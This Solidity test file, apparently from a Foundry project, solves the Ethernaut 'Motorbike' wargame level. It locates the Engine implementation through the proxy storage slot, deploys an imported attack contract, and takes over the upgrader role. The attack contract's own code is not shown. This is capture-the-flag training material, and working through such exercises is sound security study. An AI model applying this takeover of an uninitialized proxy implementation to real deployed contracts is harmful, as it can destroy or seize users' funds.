// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "lib/forge-std/ds-test/src/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut-06.sol";
import "src/levels/25-Motorbike/MotorbikeFactory.sol";
import "src/levels/25-Motorbike/MotorbikeAttack.sol";

contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        MotorbikeFactory motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(motorbikeFactory);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Engine engine = Engine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(levelAddress),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );

        // 1. Creation of `MotorbikeAttack` contract - Attacker creates `MotorbikeAttack` contract providing the address of the `Engine` contract.
        MotorbikeAttack motorbikeAttack = new MotorbikeAttack(address(engine));

        emit log_named_address(
            "Address of attacker contract: ",
            address(motorbikeAttack)
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_address(
            "Address of the upgrader before attack: ",
            engine.upgrader()
        );

        // 2. Calling the `attack()` function - Attacker calls the `attack()` function in the `MotorbikeAttack` contract.
        motorbikeAttack.attack();

        emit log_named_address(
            "Address of the upgrader after attack: ",
            engine.upgrader()
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // Test assertion
        assertEq(engine.upgrader(), address(motorbikeAttack));

        // selfdestruct has no effect in test
        // https://github.com/foundry-rs/foundry/issues/1543
        vm.etch(address((engine)), hex"");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
